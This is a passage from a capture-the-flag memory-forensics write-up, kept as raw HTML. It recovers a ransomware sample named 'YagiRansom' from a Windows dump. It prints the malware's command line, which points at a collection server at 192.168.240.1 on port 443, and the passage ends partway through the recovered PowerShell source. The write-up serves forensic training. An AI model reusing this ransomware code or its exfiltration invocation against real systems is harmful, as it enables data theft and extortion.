style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'plugins.FileScan.kernel.symbol_table_name']\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"┌──(d4nhwu4n㉿hide-and-seek)-[/mnt/e/CTF/UrgentTina SVATTT]\n└─$ vol -f update.DMP windows.filescan\nVolatility 3 Framework 2.11.0\nProgress:  100.00               PDB scanning finished\nUnsatisfied requirement plugins.FileScan.kernel.layer_name:\nUnsatisfied requirement plugins.FileScan.kernel.symbol_table_name:\n\nA translation layer requirement was not fulfilled.  Please verify that:\n        A file was provided to create this layer (by -f, --single-location or by config)\n        The file exists and is readable\n        The file is a valid memory image and was acquired cleanly\n\nA symbol table requirement was not fulfilled.  Please verify that:\n        The associated translation layer requirement was fulfilled\n        You have the correct symbol file for the requirement\n        The symbol file is under the correct directory or zip file\n        The symbol file is named appropriately or contains the correct banner\n\nUnable to validate the plugin requirements: [&#x27;plugins.FileScan.kernel.layer_name&#x27;, &#x27;plugins.FileScan.kernel.symbol_table_name&#x27;]\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cp>Hmm, the memory dump seems to be corrupted. Let’s see if there’s any workaround.\u003C/p>\n\u003Cp>-> After trying some popular functions, I concluded that the memory dump was corrupted.\u003C/p>\n\u003Cblockquote>\n\u003Cp>At this point, I didn’t know the memory dump was a mini-dump, so I incorrectly concluded it was corrupted when in fact it wasn’t.\u003C/p>\n\u003C/blockquote>\n\u003Cp>Let’s try something like \u003Ccode>strings\u003C/code> and output to a file to see the memory dump content.\u003C/p>\n\u003Cp>![Memory dump content](&#x3C;../../../assets/images/urgent-tina/2025-04-05_01-58.png)\r\n\u003Cem>Strings Content\u003C/em>\u003C/p>\n\u003Cp>This is fascinating. A program called \u003Ccode>update.exe\u003C/code> was executed in the user’s \u003Ccode>Desktop\u003C/code>.\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"c:\\users\\ieuser\\desktop\\update.exe\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">e c:\\users\\ieuser\\documents\\ \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">s \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">192.168\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">240.1\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">p \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">443\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">x\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"&#x22;c:\\users\\ieuser\\desktop\\update.exe&#x22; -e c:\\users\\ieuser\\documents\\ -s 192.168.240.1 -p 443 -x\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cblockquote>\n\u003Cp>-e c:\\users\\ieuser\\documents: Best guess is the program extracts the data to the \u003Ccode>Documents\u003C/code> folder of the user\r\n{: .prompt-info }\r\n-s 192.168.240.1: Maybe sends the data to a server at 192.168.240.1\r\n{: .prompt-info }\r\n-p 443: Uses port 443\r\n{: .prompt-info }\r\n-x: Unknown\r\n{: .prompt-info }\u003C/p>\n\u003C/blockquote>\n\u003Cp>![alt text](&#x3C;../../../assets/images/urgent-tina/2025-04-05_02-16.png)\r\n\u003Cem>Strings Content (Powershell code block)\u003C/em>\r\nA PowerShell sciprt block was found right below the place we found where the program was executed. The script is pretty long.\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#66707B;--shiki-dark:#BDC4CC\"># Design\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$ProgressPreference\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"SilentlyContinue\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$ErrorActionPreference\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"SilentlyContinue\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$OSVersion \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Environment\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::OSVersion.Platform\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($OSVersion \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-like\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"*Win*\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$Host\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.UI.RawUI.WindowTitle \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"YagiRansom\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$Host\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.UI.RawUI.BackgroundColor \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"Black\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$Host\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.UI.RawUI.ForegroundColor \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"White\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#66707B;--shiki-dark:#BDC4CC\"># Variables\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Mode \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">0\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$WiETm \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">3\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">3\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">5\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$ENyR \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">6\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$DCe \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#66707B;--shiki-dark:#BDC4CC\"># Errors\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">0\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-like\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"-h*\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">break\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">0\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[!] Not enough/Wrong parameters!\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Red ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">break\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[!] Not enough/Wrong parameters!\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Red ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">break\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">2\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[!] Not enough/Wrong parameters!\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Red ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">break\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">3\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[!] Not enough/Wrong parameters!\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Red ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">break\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#66707B;--shiki-dark:#BDC4CC\"># Proxy Aware\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Net.WebRequest\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::DefaultWebProxy \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Net.WebRequest\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::GetSystemWebProxy()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Net.WebRequest\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::DefaultWebProxy.Credentials \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Net.CredentialCache\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::DefaultNetworkCredentials\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$AllProtocols \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Net.SecurityProtocolType\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"Ssl3,Tls,Tls11,Tls12\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Net.ServicePointManager\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::SecurityProtocol \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $AllProtocols\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#66707B;--shiki-dark:#BDC4CC\"># Functions\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$OgE \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Environment\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::MachineName).ToLower() ; $zVSza \u003C/span>\u003Cspan 